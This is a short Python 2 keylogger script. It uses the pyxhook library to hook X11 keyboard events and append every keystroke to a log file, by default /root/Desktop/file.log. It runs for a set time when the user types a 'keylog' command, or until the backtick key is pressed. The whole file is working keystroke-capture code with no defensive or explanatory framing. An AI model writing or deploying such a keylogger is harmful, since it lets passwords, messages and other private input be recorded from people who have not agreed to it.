import pyxhook
from threading import Timer 
def start(timelog,LOG_FILENAME):
	#LOG_FILENAME ='/root/Desktop/file.log'
	def OnKeyboardEvent(event):
	   with open(LOG_FILENAME,mode='a') as f :
	   	f.write(event.Key)
	   	f.write('\n')
	   if event.Ascii==96: 
	     new_hook.cancel()
	new_hook=pyxhook.HookManager()
	new_hook.KeyDown=OnKeyboardEvent
	new_hook.HookKeyboard()
	new_hook.start()
	def stop():
		new_hook.cancel()
	t = Timer(timelog,stop)
	t.start()

data = raw_input("enter : ")

if data.startswith("keylog") == True :
	if len(data.split(" ")) == 1 :
		timelog=10
		start(timelog,'/root/Desktop/file.log')
	elif len(data.split(" ")) == 2 :
		timelog = float(data.split(" ")[1])
		start(timelog,'/root/Desktop/file.log')
	elif len(data.split(" ")) == 3 :
		timelog = float(data.split(" ")[1])
		LOG_FILENAME = str(data.split(" ")[2])
		start(timelog,LOG_FILENAME)
